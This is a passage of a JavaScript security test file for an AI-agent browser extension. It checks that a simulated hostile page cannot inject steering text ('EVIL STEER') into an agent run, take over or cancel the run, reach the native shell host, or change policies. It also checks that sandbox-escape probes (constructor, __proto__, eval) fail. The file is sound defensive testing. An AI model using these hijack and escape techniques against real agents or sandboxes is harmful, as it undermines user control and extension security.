            tried.inject = await sendBounded(bg, { type: "INJECT_MESSAGE", payload: { runId: "nav-run", text: "EVIL STEER" } }, destSender());
            tried.reclaim = await sendBounded(bg, { type: "START_RUN", payload: { runId: "nav-run", task: "EVIL RECLAIM", systemPrompt: "evil", tools: [], model: "text-driver", maxSteps: 2, surface: "off", rebuild: { toolNames: [], model: "text-driver" } } }, destSender());
            for (const type of FORMER_RUN_TAB_TYPES) tried[type] = await sendBounded(bg, knowingMessage(type, "nav-run"), destSender());
        },
    });
    for (const [what, r] of Object.entries(tried)) assert.match(r?.error || "", /^Refused/, `${what}: ${JSON.stringify(r)}`);
    assert.equal(w.driver, 3, "the run was not stopped: it went on to its look and answered");
    assert.ok(w.log.some((r) => r.kind === "handed-to-worker" && r.reason === "navigated-to-unapproved-site"), "handed over");
    const looks = w.pageCalls.filter((p) => p.name === "look" && !p.renderOnly && !p.precheck && !p.geometry);
    assert.deepEqual(looks, [], "the look after the navigation ran in the worker: the page was never sent it");
    assert.ok(w.pageCalls.some((p) => p.geometry), "positive control: the page was asked for geometry, so the look ran");
    assert.ok(!w.seen.includes("the page's own look"), "the model never saw a look the page answered");
    assert.ok(!w.seen.includes("EVIL"), "no turn, steer or reclaim of the page's reached the run");
});

test("PART 5 — a destination that blocks its own re-adopt still has the run handed over, and its page still gets nothing", async () => {
    const tried = {};
    const w = await navigatedRun("https://evil.example/landing", {
        readopt: false,
        onDestination: async (bg, { destSender }) => { for (const type of FORMER_RUN_TAB_TYPES) tried[type] = await sendBounded(bg, knowingMessage(type, "nav-run"), destSender()); },
    });
    assert.ok(w.log.some((r) => r.kind === "handed-to-worker"), "handed over at the commit, with nothing from the destination");
    for (const type of FORMER_RUN_TAB_TYPES) assert.match(tried[type]?.error || "", /^Refused: https:\/\/evil\.example is not approved/, `${type}: ${JSON.stringify(tried[type])}`);
    assert.ok(!JSON.stringify(w.bg.calls).includes("EVIL FROM THE RUN'S PAGE"));
});

// --- part 5: the hand-over at a revoke, which the revoked page cannot stop or delay ---

test("PART 5 REVOKE — a page whose site is revoked while its run is in its call cannot stop or delay the hand-over: a flood of sends, re-adopts it sends and one it never sends leave the run the worker's from the revoke", async () => {
    const A = "https://builder.example/start";
    const page = { tab: { id: 7, url: A }, url: A, origin: "https://builder.example", frameId: 0, documentId: "doc-builder" };
    const popup = { url: "chrome-extension://test/popup.html" };
    const calls = [{ name: "scroll", args: {} }, { name: "look", args: { question: "Q-SECRET what is shown" } }];
    let bg, driver = 0, handedAtRevoke = null, mark = null, backendMark = null;
    const flood = [], readopts = [], after = [];
    bg = loadBackground({
        config: baseConfig({ model: "text-driver", ocrModel: "reader-vl" }), siteGate: true, local: { ml_site_always: ["https://builder.example"] },
        openTabs: [{ id: 7, windowId: 1, active: true, url: A, title: "Builder" }],
        onCaptureTab: async () => "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
        onFetch: (call) => {
            if (call.url.endsWith("/api/models")) return jsonResponse({ data: [{ id: "text-driver" }, { id: "reader-vl" }] });
            if (call.url.endsWith("/api/show")) return call.body?.model === "reader-vl" ? jsonResponse({ capabilities: ["completion", "vision"], model_info: {} }) : jsonResponse({ capabilities: ["completion", "tools"], model_info: {} });
            if (!call.url.includes("/chat/completions")) return jsonResponse({});
            if (!call.body?.tools?.length) return jsonResponse({ choices: [{ message: { content: "the reader's words" } }] });
            const next = calls[driver++];
            return jsonResponse(next ? { choices: [{ message: { content: null, tool_calls: [{ id: `c${driver}`, type: "function", function: { name: next.name, arguments: JSON.stringify(next.args) } }] } }] } : { choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_t, msg) => {
            if (msg.type === "SHOT_RECTS") return { vw: 1024, vh: 768, rects: [] };
            if (msg.type !== "RUN_TOOL_IN_PAGE") return undefined;
            const p = msg.payload;
            if (p.geometry) return { result: "", geometry: { seq: p.geometry.seq, reply: p.geometry.op === "view" ? { w: 1024, h: 768, dpr: 1, sx: 0, sy: 0 } : p.geometry.op === "legend" ? { controls: [], media: [], boundaries: [], text: [], moreControls: 0, moreMedia: 0 } : null } };
            if (p.finish || p.renderOnly || p.precheck || p.readonlyTry) return { result: "" };
            if (p.name !== "scroll") return { result: `the page's own ${p.name}: Q-SECRET seen` };
            // In the run's scroll, the page floods the worker with everything it knows to send for the run, unawaited,
            // and the person revokes the site from the popup in the middle of it.
            const revoked = bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "revoke", origin: "https://builder.example" } } }, popup);
            for (let i = 0; i < 20; i++) {
                for (const type of FORMER_RUN_TAB_TYPES) flood.push(sendBounded(bg, knowingMessage(type, "page-run"), page));
                flood.push(sendBounded(bg, { type: "VALUE_COLUMNS", runId: "page-run", key: "k", names: ["a"] }, page));
            }
            await revoked;
            // The popup's answer comes once the revoke is decided: the run is the worker's before the flood has settled.
            handedAtRevoke = (await bg.context.__mlRunLog.all()).some((r) => r.run === "page-run" && r.kind === "handed-to-worker");
            mark = bg.tabMessages.length; backendMark = bg.calls.length;
            // From the revoke on, everything the page knows to send for the run is refused.
            for (const type of FORMER_RUN_TAB_TYPES) after.push([type, await sendBounded(bg, knowingMessage(type, "page-run"), page)]);
            after.push(["RESUME_RUN", await sendBounded(bg, { type: "RESUME_RUN", payload: { runId: "page-run", task: "EVIL TURN" } }, page)]);
            after.push(["INJECT_MESSAGE", await sendBounded(bg, { type: "INJECT_MESSAGE", payload: { runId: "page-run", text: "EVIL STEER" } }, page)]);
            after.push(["VALUE_COLUMNS", await sendBounded(bg, { type: "VALUE_COLUMNS", runId: "page-run", key: "k", names: ["a"] }, page)]);
            // A page that re-adopts the run, over and over, from its still-loaded document, while it holds its call.
            for (let i = 0; i < 5; i++) readopts.push(JSON.parse(JSON.stringify(await bg.send({ type: "CONTENT_READY" }, page))));
            await new Promise((r) => setTimeout(r, 200));
            return { result: "scrolled" };
        },
    });
    const tool = (name) => ({ name, description: name, parameters: { type: "object", properties: {} }, requiresApproval: false, capabilities: name === "look" ? ["vision"] : [] });
    void bg.send({ type: "START_RUN", payload: { runId: "page-run", task: "go", systemPrompt: "sys", tools: ["scroll", "look"].map(tool), model: "text-driver", think: null, maxSteps: 10, surface: "off", crossOrigin: true, approvalRouting: "both",
        rebuild: { toolNames: ["scroll", "look"], model: "text-driver", driverSees: false, visionModel: "reader-vl", groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: true } } }, page);
    for (let i = 0; i < 3000 && driver <= calls.length; i++) {
        for (const g of bg.context.__mlApprovals.list()) bg.context.__mlApprovals.resolve(g.key, true);
        await new Promise((r) => setTimeout(r, 2));
    }
    await new Promise((r) => setTimeout(r, 30));
    const settled = await Promise.all(flood);
    assert.equal(handedAtRevoke, true, "handed over by the time the popup's revoke was answered, the flood still in flight");
    assert.equal(driver, 3, "the run went on to its look and answered");
    assert.ok(settled.every((r) => !r?.timeout), "every page send was answered: none was let through to a handler that hangs");
    for (const r of readopts) {
        const a = (r?.adopt ?? []).find((x) => x.runId === "page-run");
        if (a) { assert.equal(a.rebuild.builtBy, "worker", `a re-adopt after the revoke is the worker's: ${JSON.stringify(a)}`); assert.equal(a.rebuild.model, null); }
    }
    for (const [type, r] of after) assert.match(r?.error || "", /^Refused/, `${type} after the revoke: ${JSON.stringify(r)}`);
    const toPage = bg.tabMessages.slice(mark).map(([, m]) => JSON.parse(JSON.stringify(m)));
    assert.deepEqual(toPage.filter((m) => m.type === "RUN_TOOL_IN_PAGE" && m.payload.name === "look" && !m.payload.renderOnly && !m.payload.geometry), [], "the look after the revoke ran in the worker");
    assert.ok(toPage.some((m) => m.type === "RUN_TOOL_IN_PAGE" && m.payload.geometry), "positive control: the page was asked for geometry, so the look ran");
    assert.deepEqual(toPage.filter((m) => m.type !== "ML_DEBUG_TO_PAGE" && JSON.stringify(m).includes("Q-SECRET")).map((m) => m.type), [], "the question never reached the page");
    const seen = JSON.stringify(bg.calls.filter((c) => c.body?.tools?.length).at(-1)?.body?.messages ?? []);
    assert.ok(!seen.includes("EVIL"), "no turn or steer of the page's reached the run");
    assert.ok(!JSON.stringify(bg.calls.slice(backendMark)).includes("EVIL FROM THE RUN'S PAGE"), "nothing the page sent after the revoke reached the backend");
    assert.deepEqual((await bg.context.__mlRunLog.all()).filter((r) => r.run === "page-run" && r.kind === "handed-to-worker").map((r) => r.reason), ["site-revoked"]);
});

// --- the upgrade: what the code before part 5 left behind ---

/** What the code before part 5 stored for a page-built run that had navigated onto an unapproved site and was in flight
 *  when the worker went away: its durable-resume snapshot (sw-runs.ts `persistRun`), page-built (no `builtBy`), its
 *  rebuild naming the page's models, as that code wrote it. `version` is the build that wrote it. */
const oldSnapshot = (version) => ({
    p: {
        runId: "old-run", task: "summarise", systemPrompt: "sys", model: "text-driver", think: null, maxSteps: 10, surface: "off", crossOrigin: true, approvalRouting: "both",
        autoApprovePython: false, autoApproveReadonly: false,
        tools: [{ name: "look", description: "look", parameters: { type: "object", properties: {} }, requiresApproval: false, capabilities: ["vision"] }],
        rebuild: { toolNames: ["look"], model: "text-driver", driverSees: false, visionModel: "reader-vl", groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: true },
        pageOrigin: "https://builder.example", pageUrl: "https://builder.example/start",
    },
    tabId: 7,
    messages: [{ role: "system", content: "sys" }, { role: "user", content: "summarise" }],
    version, ts: Date.now(),
});

/** A worker restarting over `local` storage, with tab 7 on the unapproved site, whose driver calls `look` once. */
function restartedWorker(local) {
    const UNAPPROVED = "https://evil.example/landing";
    let driver = 0;
    const bg = loadBackground({
        config: baseConfig({ model: "text-driver", ocrModel: "reader-vl" }), siteGate: true, manifestVersion: "9.9.9",
        local: { ml_site_always: ["https://builder.example"], ...local }, openTabs: [{ id: 7, windowId: 1, active: true, url: UNAPPROVED, title: "Evil" }],
        onCaptureTab: async () => "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
        onFetch: (call) => {
            if (call.url.endsWith("/api/models")) return jsonResponse({ data: [{ id: "text-driver" }, { id: "reader-vl" }] });
            if (call.url.endsWith("/api/show")) return call.body?.model === "reader-vl" ? jsonResponse({ capabilities: ["completion", "vision"], model_info: {} }) : jsonResponse({ capabilities: ["completion", "tools"], model_info: {} });
            if (!call.url.includes("/chat/completions")) return jsonResponse({});
            if (!call.body?.tools?.length) return jsonResponse({ choices: [{ message: { content: "the reader's words" } }] });
            return jsonResponse(driver++ === 0 ? { choices: [{ message: { content: null, tool_calls: [{ id: "u1", type: "function", function: { name: "look", arguments: "{}" } }] } }] } : { choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_t, msg) => {
            if (msg.type === "SHOT_RECTS") return { vw: 1024, vh: 768, rects: [] };
            if (msg.type !== "RUN_TOOL_IN_PAGE") return undefined;
            const p = msg.payload;
            if (p.geometry) return { result: "", geometry: { seq: p.geometry.seq, reply: p.geometry.op === "view" ? { w: 1024, h: 768, dpr: 1, sx: 0, sy: 0 } : p.geometry.op === "legend" ? { controls: [], media: [], boundaries: [], text: [], moreControls: 0, moreMedia: 0 } : null } };
            return { result: "" };
        },
    });
    const sender = { tab: { id: 7, url: UNAPPROVED }, url: UNAPPROVED, origin: "https://evil.example", frameId: 0, documentId: "doc-after" };
    return { bg, sender, driverCalls: () => driver };
}

test("PART 5 UPGRADE — a page-built run in flight under the old rule, its snapshot on disk, resumes on its unapproved page as the worker's, and that page gets nothing", async () => {
    const { bg, sender, driverCalls } = restartedWorker({ "ml_bgrun_old-run": oldSnapshot("9.9.9") });
    const ready = JSON.parse(JSON.stringify(await bg.send({ type: "CONTENT_READY" }, sender)));
    const adopt = (ready?.adopt ?? []).find((a) => a.runId === "old-run");
    assert.ok(adopt, `the run is re-adopted: ${JSON.stringify(ready)}`);
    assert.equal(adopt.rebuild.builtBy, "worker", "the worker's run");
    assert.equal(adopt.rebuild.model, null, "the old snapshot's model names stay in the worker");
    assert.ok(!JSON.stringify(adopt).includes("reader-vl"));
    void bg.send({ type: "RUN_READOPTED", payload: { runId: "old-run", pageInfo: "here" } }, sender);   // fire-and-forget: never answered
    // While it runs, the page's own sends of what the old rule let it send are refused.
    const tried = {};
    for (const type of FORMER_RUN_TAB_TYPES) tried[type] = await sendBounded(bg, knowingMessage(type, "old-run"), sender);
    for (let i = 0; i < 500 && driverCalls() < 2; i++) await tick();
    assert.equal(driverCalls(), 2, "the run continued: its look, then its answer");
    const looks = bg.tabMessages.filter(([, m]) => m.type === "RUN_TOOL_IN_PAGE" && m.payload.name === "look" && !m.payload.renderOnly && !m.payload.geometry);
    assert.deepEqual(looks, [], "its look ran in the worker");
    for (const type of FORMER_RUN_TAB_TYPES) assert.match(tried[type]?.error || "", /^Refused/, `${type}: ${JSON.stringify(tried[type])}`);
    assert.ok(!JSON.stringify(bg.calls).includes("EVIL FROM THE RUN'S PAGE"));
});

test("PART 5 UPGRADE — a snapshot written by the build before the update is not resumed, and its tab's page is not lent anything for it", async () => {
    const { bg, sender, driverCalls } = restartedWorker({ "ml_bgrun_old-run": oldSnapshot("9.9.8") });
    const ready = JSON.parse(JSON.stringify(await bg.send({ type: "CONTENT_READY" }, sender)));
    assert.deepEqual((ready?.adopt ?? []).map((a) => a.runId), [], "a cross-version snapshot is dropped, never re-adopted");
    assert.equal(bg.localStore["ml_bgrun_old-run"], undefined, "and deleted");
    const r = await sendBounded(bg, knowingMessage("FETCH_LLM", "old-run"), sender);
    assert.match(r?.error || "", /^Refused/);
    await tick();
    assert.equal(driverCalls(), 0, "nothing resumed it");
});

// --- the process host behind ml.sh: no page reaches it (docs/spec/SHELL.md, "Security invariants") ---

test("GAIN blocked — EVERY page-started message type, from an approved origin or not, never reaches the process host", async () => {
    const { fakeNativeHost } = await import("./fake-native-host.mjs");
    const extensionPage = { id: "test", url: "chrome-extension://test/sidebar.html" };
    for (const [label, local, sender] of [
        ["unapproved", {}, hostilePage()],
        ["approved", { ml_site_always: ["https://evil.example"] }, hostilePage()],
    ]) {
        const host = fakeNativeHost();
        // ml.sh is ON with a folder, so the worker has a live, configured port the whole time the page tries.
        const bg = loadBackground({ config: baseConfig({ shellEnabled: true, shellRoots: ["/w/proj"] }), siteGate: true, local, onNative: host.onNative, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
        await bg.send({ type: "SHELL_STATUS", payload: { refresh: true } }, extensionPage);
        const connects = bg.nativeConnects.length, calls = host.calls.length;
        assert.deepEqual(host.names(), ["hello", "configure"], `${label}: positive control: the port is live`);
        for (const type of PAGE_STARTED_TYPES) await attempt(bg, type, sender);
        // The status message itself, which a content script could send, and its refresh (which would start the host).
        const st = await bg.send({ type: "SHELL_STATUS", payload: { refresh: true } }, sender);
        assert.equal(st?.error, "Refused", `${label}: a content script's SHELL_STATUS is refused`);
        await tick();
        assert.equal(bg.nativeConnects.length, connects, `${label}: no page-started type opened a native port`);
        assert.deepEqual(host.calls.slice(calls), [], `${label}: no page-started type sent the host anything`);
        // Positive control: the counters move when the extension itself reaches the host.
        host.exit();
        await tick();
        await bg.send({ type: "SHELL_STATUS", payload: { refresh: true } }, extensionPage);
        assert.equal(bg.nativeConnects.length, connects + 1, `${label}: positive control: a reconnect is counted`);
    }
});

// --- ml.sh stays out of the page's world (docs/spec/SHELL.md; exec-routing.ts) ---

test("GAIN blocked — ml.sh is never handed to the main world: routeExec forces isolation or refuses", async () => {
    const { routeExec, execNames } = await import("../src/sw/exec-routing.ts");
    // A script naming ml.sh is forced isolated. With no isolation available it is REFUSED, never downgraded.
    const named = execNames("ml.sh.run(['ls'])");
    assert.equal(named.sh, true, "positive control: the lexical check sees ml.sh");
    const noIso = { userScripts: false, cdp: false };
    for (const approvedPage of [true, false]) {
        const r = routeExec("ml.sh.run(['ls'])", approvedPage, noIso, {});
        assert.equal(r.where, "refused", `approved=${approvedPage}: ml.sh with no isolation is refused, got ${JSON.stringify(r)}`);
        assert.notEqual(r.where, "main", `approved=${approvedPage}: ml.sh never runs in the main world`);
    }
    // world: "page" never overrides the forced isolation for ml.sh.
    const forced = routeExec("ml.sh.run(['ls'])", true, noIso, { world: "page" });
    assert.equal(forced.where, "refused", `world:"page" cannot force ml.sh into the main world, got ${JSON.stringify(forced)}`);
    // Positive control: a script that does NOT name ml.sh can run in the main world on an approved page.
    const plain = routeExec("1 + 1", true, noIso, { world: "page" });
    assert.equal(plain.where, "main", `positive control: a plain script runs in the main world, got ${JSON.stringify(plain)}`);
});

// --- the POLICIES message is extension-surface only (background.ts) ---

test("GAIN blocked — a page cannot add, edit or remove a policy: POLICIES is refused from a content script", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true, local: { ml_site_always: ["https://evil.example"] }, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const sender = hostilePage();
    for (const op of ["add", "edit", "remove"]) {
        const r = await bg.send({ type: "POLICIES", payload: { op, source: "(c) => true", label: "evil", effect: "allow", consumer: "fetch", id: "pol-x" } }, sender);
        assert.equal(r?.error, "refused", `op=${op}: a page's POLICIES is refused`);
    }
    // Positive control: an extension page can list.
    const ext = { id: "test", url: "chrome-extension://test/sidebar.html" };
    const ok = await bg.send({ type: "POLICIES", payload: { op: "list" } }, ext);
    assert.ok(ok?.data !== undefined || ok?.error === undefined, "positive control: an extension page's POLICIES list is answered");
});

// --- propose_policy is worker-built only, and never adds a policy on its own (propose-policy-tool.ts) ---

test("GAIN blocked — propose_policy without the worker's deps refuses and adds nothing", async () => {
    const { proposePolicyTool } = await import("../src/tools/propose-policy-tool.ts");
    const tool = proposePolicyTool((d) => d);   // descriptor-only: no deps
    const r = await tool.run({ effect: "allow", when: "(c) => true", label: "evil" });
    assert.match(String(r), /Error.*only in a run the extension started/, `descriptor-only propose_policy refuses, got: ${r}`);
});

// --- the policy realm is a sandbox: a policy cannot escape its facade (policy-realm.ts) ---

test("GAIN blocked — a policy cannot mutate its facts facade or read constructor/__proto__", async () => {
    const { evalPolicy } = await import("../src/readonly-exec/policy-realm.ts");
    const { fromFetch } = await import("../src/effects.ts");
    const facts = { kind: "fetch", url: "https://x.example/", host: "x.example", method: "GET", credentials: false, rendered: false, effects: fromFetch({ url: "https://x.example/" }) };

    // Mutating c fails (deep frozen facade).
    const mut = evalPolicy("(c) => { c.host = 'evil'; return true; }", facts, "allow");
    assert.ok(mut.broken, `mutating c must break the policy, got ${JSON.stringify(mut)}`);
    assert.ok(!mut.decision, `a mutating policy must not decide, got ${JSON.stringify(mut)}`);

    // Reading c.constructor breaks (strict facade).
    const ctor = evalPolicy("(c) => c.constructor", facts, "allow");
    assert.ok(ctor.broken, `reading c.constructor must break, got ${JSON.stringify(ctor)}`);

    // Reading c.__proto__ breaks.
    const proto = evalPolicy("(c) => c.__proto__", facts, "allow");
    assert.ok(proto.broken, `reading c.__proto__ must break, got ${JSON.stringify(proto)}`);

    // Reading a field the call does not have breaks (typo → broken, not silent false).
    const typo = evalPolicy("(c) => c.urll === 'x'", facts, "allow");
    assert.ok(typo.broken, `reading a missing field must break, got ${JSON.stringify(typo)}`);

    // Positive control: a well-formed policy decides.
    const ok = evalPolicy("(c) => c.host === 'x.example'", facts, "allow");
    assert.equal(ok.decision, "allow", `positive control: a clean policy allows, got ${JSON.stringify(ok)}`);
    const deny = evalPolicy("(c) => c.host === 'x.example'", facts, "deny");
    assert.equal(deny.decision, "deny", `positive control: a deny policy denies, got ${JSON.stringify(deny)}`);
});

test("GAIN blocked — a policy cannot reach a function or the global scope through its root", async () => {
    const { evalPolicy } = await import("../src/readonly-exec/policy-realm.ts");
    const { fromFetch } = await import("../src/effects.ts");
    const facts = { kind: "fetch", url: "https://x.example/", host: "x.example", method: "GET", credentials: false, rendered: false, effects: fromFetch({ url: "https://x.example/" }) };

    // eval and Function are not in the policy root.
    const evalTry = evalPolicy("(c) => eval('1')", facts, "allow");
    assert.ok(evalTry.broken, `eval must break, got ${JSON.stringify(evalTry)}`);
    const fnTry = evalPolicy("(c) => Function('return 1')()", facts, "allow");
    assert.ok(fnTry.broken, `Function must break, got ${JSON.stringify(fnTry)}`);

    // == and != are refused at parse time.
    const loose = evalPolicy("(c) => c.host == 'x.example'", facts, "allow");
    assert.ok(loose.broken, `== must break, got ${JSON.stringify(loose)}`);

    // Positive control: === works.
    const strict = evalPolicy("(c) => c.host === 'x.example'", facts, "allow");
    assert.equal(strict.decision, "allow", `positive control: === works, got ${JSON.stringify(strict)}`);
});

// --- shell output pointers are bound to their run (sw-shell-call.ts shRead) ---

test("GAIN blocked — the shell and policy message types are absent from HANDLE_MAP", () => {
    // No page-started type maps to SHELL_EXEC, SHELL_HELLO, or any policy mutation.
    for (const t of ["SHELL_EXEC", "SHELL_HELLO", "SHELL_RUN", "SHELL_READ", "POLICIES", "POLICY_ADD", "PROPOSE_POLICY"]) {
        assert.ok(!PAGE_STARTED_TYPES.has(t), `${t} must not be a page-started type`);
    }
    // And the relay's own map has no shell/policy entry either.
    for (const [req, entry] of Object.entries(HANDLE_MAP)) {
        assert.ok(!/SHELL|POLIC/i.test(entry.type), `HANDLE_MAP[${req}] maps to ${entry.type} — shell/policy must not be relayable`);
    }
});

// --- Stop of a read-only survey in the page: CANCEL_TOOL_IN_PAGE and PAGE_TOOL_CANCEL (sw-run-host.ts tryReadonly) ---
// The worker tells the run's tab on Stop; content.ts re-posts it to the main world, where the page can post it too.
// The page-leg properties (what a forged PAGE_TOOL_CANCEL does to the bridge) are in tests/readonly-stop.test.mjs.

const SURVEY_TOOLS = [{ name: "exec", requiresApproval: true, description: "", parameters: { type: "object", properties: { js: { type: "string" } } }, capabilities: [] }];
const SURVEY_PAGE = "https://evil.example/attack";
const surveyPageSender = (tabId) => ({ tab: { id: tabId, url: SURVEY_PAGE }, url: SURVEY_PAGE, origin: "https://evil.example", frameId: 0, documentId: `doc-${tabId}` });
/** A background run hosted for the page on `tabId` whose model calls `exec` on a survey that reads the DOM (so the
 *  worker sends it to the page), then answers "done". `onSurvey(payload)` plays the page's read-only try; `onExec` the
 *  approved run; an awaitingApproval gate is handed to `onGate(event)`. */
function surveyBackground({ onSurvey, onExec = () => ({ result: "EXEC RAN" }), onGate = () => {} }) {
    const turns = new Map();
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (!call.url.includes("/chat/completions")) return jsonResponse({});
            const runId = JSON.stringify(call.body?.messages ?? []).match(/SYS:([\w-]+)/)?.[1];   // the system prompt names the run
            const n = (turns.get(runId) ?? 0) + 1; turns.set(runId, n);
            return jsonResponse(n === 1
                ? { choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: JSON.stringify({ js: "document.title" }) } }] } }] }
                : { choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) onGate(msg.event);
            if (msg?.type !== "RUN_TOOL_IN_PAGE") return undefined;
            const p = msg.payload;
            if (p.readonlyTry) return onSurvey(p, tabId);
            if (p.renderOnly || p.precheck || p.finish) return { result: "" };
            return onExec(p, tabId);
        },
    });
    const start = (runId, tabId) => bg.send({ type: "START_RUN", payload: {
        runId, task: "survey", systemPrompt: `SYS:${runId}`, tools: SURVEY_TOOLS, model: "m", think: null, maxSteps: 5,
        autoApprovePython: false, autoApproveReadonly: true, surface: "devtools",
    } }, surveyPageSender(tabId));
    const cancels = () => bg.tabMessages.filter(([, m]) => m?.type === "CANCEL_TOOL_IN_PAGE");
    const execs = () => bg.tabMessages.filter(([, m]) => m?.type === "RUN_TOOL_IN_PAGE" && m.payload?.name === "exec" && !m.payload.readonlyTry && !m.payload.renderOnly && !m.payload.precheck && !m.payload.finish);
    return { bg, start, cancels, execs, turns };
}

test("a page that knows the run id cannot reach CANCEL_TOOL_IN_PAGE through the worker: its own CANCEL_TOOL_IN_PAGE or PAGE_TOOL_CANCEL tells no tab and does not end the run", async () => {
    let s, answers = null;
    s = surveyBackground({ onSurvey: async (p, tabId) => {
        // Mid-survey, the page sends every shape of the stop it can name, with the run id it saw in PAGE_TOOL_RUN.
        const msgs = [
            { type: "CANCEL_TOOL_IN_PAGE", payload: { runId: p.runId } },
            { type: "CANCEL_TOOL_IN_PAGE", runId: p.runId, payload: { runId: p.runId, tabId: 99 } },
            { type: "PAGE_TOOL_CANCEL", runId: p.runId, payload: { runId: p.runId } },
            { type: "CANCEL_TOOL_IN_PAGE_REQUEST", requestId: "x", payload: { runId: p.runId } },
        ];
        answers = [];
        for (const m of msgs) answers.push(await sendBounded(s.bg, m, surveyPageSender(tabId), 300));
        await tick();
        return { readonly: true, result: "value: TITLE-4417" };
    } });
    const res = await s.start("rt-cancel-forge", 4);
    assert.ok(answers, "positive control: the survey reached the page");
    assert.ok(answers.every((a) => a.timeout || a.error || a.data == null), `no stop message was answered with data: ${JSON.stringify(answers)}`);
    assert.ok(!res.data?.cancelled, `the run was not cancelled: ${JSON.stringify(res)}`);
    assert.equal(s.turns.get("rt-cancel-forge"), 2, "the run went on to its next model turn");
    const turn2 = s.bg.calls.filter((c) => JSON.stringify(c.body?.messages ?? []).includes("SYS:rt-cancel-forge")).at(-1);
    assert.match(JSON.stringify(turn2.body.messages), /TITLE-4417/, "positive control: the survey's answer reached the model");
    assert.deepEqual(s.cancels(), [], "no CANCEL_TOOL_IN_PAGE went to any tab on the page's word");
    assert.deepEqual(s.execs(), [], "and nothing ran past the survey");
});

test("Stop during a page survey tells only the run's own tab, once, with only the run id; another run's survey on another tab goes on", async () => {
    let s, releaseB;
    const reached = new Set();
    s = surveyBackground({ onSurvey: (p) => {
        reached.add(p.runId);
        if (p.runId === "rt-stop-A") return new Promise(() => {});   // a survey that does not end on its own
        return new Promise((r) => { releaseB = () => r({ readonly: true, result: "value: B-OK" }); });
    } });
    const a = s.start("rt-stop-A", 4), b = s.start("rt-stop-B", 5);
    for (let i = 0; i < 400 && reached.size < 2; i++) await tick();
    assert.equal(reached.size, 2, "positive control: both surveys reached their pages");
    s.bg.send({ type: "CANCEL_RUN", payload: { runId: "rt-stop-A" } });   // the person's Stop, from an extension surface
    const ra = await a;
    assert.ok(ra.data?.cancelled, `run A ended cancelled: ${JSON.stringify(ra)}`);
    await tick();
    const cancels = JSON.parse(JSON.stringify(s.cancels()));
    assert.deepEqual(cancels, [[4, { type: "CANCEL_TOOL_IN_PAGE", payload: { runId: "rt-stop-A" } }]], "one message, to run A's tab, naming run A alone");
    releaseB();
    const rb = await b;
    assert.ok(!rb.data?.cancelled, "run B was not stopped");
    assert.equal(s.turns.get("rt-stop-B"), 2, "run B went on to its next turn");
    assert.deepEqual(s.execs(), [], "the stop ran nothing in either page");
});

test("a survey the page refuses (what a forged PAGE_TOOL_CANCEL yields) on a run nobody stopped asks the person: nothing runs before the approval, and the run is not cancelled", async () => {
    let s, gate = null, ranBeforeGate = null;
    s = surveyBackground({
        onSurvey: () => ({ readonly: false, result: "" }),
        onGate: (ev) => {
            gate = ev;
            ranBeforeGate = s.execs().length;
            setTimeout(() => { void s.bg.send({ type: "SET_APPROVAL", payload: { runId: ev.id, seq: ev.seq, decision: true } }); }, 30);
        },
    });
    const res = await s.start("rt-refused", 4);
    assert.ok(gate, "the refused survey reached the approval gate");
    assert.equal(ranBeforeGate, 0, "nothing ran before the person decided");
    assert.ok(!res.data?.cancelled, `the run was not cancelled: ${JSON.stringify(res)}`);
    assert.equal(s.execs().length, 1, "positive control: approved, the exec ran once");
    assert.deepEqual(s.cancels(), [], "and no stop went to the page");
});

test("the page relay carries no stop: CANCEL_TOOL_IN_PAGE and PAGE_TOOL_CANCEL are not page-startable, and a page posting them reaches no background type", async () => {
    for (const t of ["CANCEL_TOOL_IN_PAGE", "PAGE_TOOL_CANCEL"]) {
        assert.ok(!PAGE_STARTED_TYPES.has(t), `${t} is page-startable`);
        assert.ok(!(t in HANDLE_MAP) && !Object.values(HANDLE_MAP).some((e) => e.type === t), `${t} is in HANDLE_MAP`);
    }
    const relayed = await pageRelays(
        { type: "CONFIG_REQUEST", requestId: "ctrl", payload: {} },   // positive control
        { type: "CANCEL_TOOL_IN_PAGE", requestId: "a", payload: { runId: "victim" } },
        { type: "CANCEL_TOOL_IN_PAGE_REQUEST", requestId: "b", payload: { runId: "victim" } },
        { type: "PAGE_TOOL_CANCEL", runId: "victim" },
    );
    assert.ok(relayed.includes("GET_CONFIG"), "positive control: a real request type still relays");
    assert.deepEqual(relayed.filter((t) => t !== "GET_CONFIG"), [], `relayed: ${relayed}`);
});

test("content.ts re-posts the worker's CANCEL_TOOL_IN_PAGE as exactly { type, runId }: nothing else of the payload, nothing for a non-string runId, and nothing back to the worker", async () => {
    const world = loadPageWorld({ onRuntimeMessage: () => ({ data: null }) });
    const posted = [];
    await tick();
    world.fromContent((e) => { if (e.data?.type !== "PAGE_ADOPT_HELLO") posted.push(JSON.parse(JSON.stringify(e.data))); });
    posted.length = 0;   // the page's own boot messages
    const before = world.runtimeCalls.length;
    const answer = await world.fireRuntimeMessage({ type: "CANCEL_TOOL_IN_PAGE", payload: { runId: "r1", type: "PAGE_TOOL_RESULT", callId: "c", envelope: { readonly: true, result: "FORGED" } } });
    for (const runId of [{ toString: () => "r2" }, ["r3"], 4, null]) await world.fireRuntimeMessage({ type: "CANCEL_TOOL_IN_PAGE", payload: { runId } });
    await world.fireRuntimeMessage({ type: "CANCEL_TOOL_IN_PAGE" });
    await tick();
    assert.equal(answer, undefined, "the channel is not held open: nothing answers the worker");
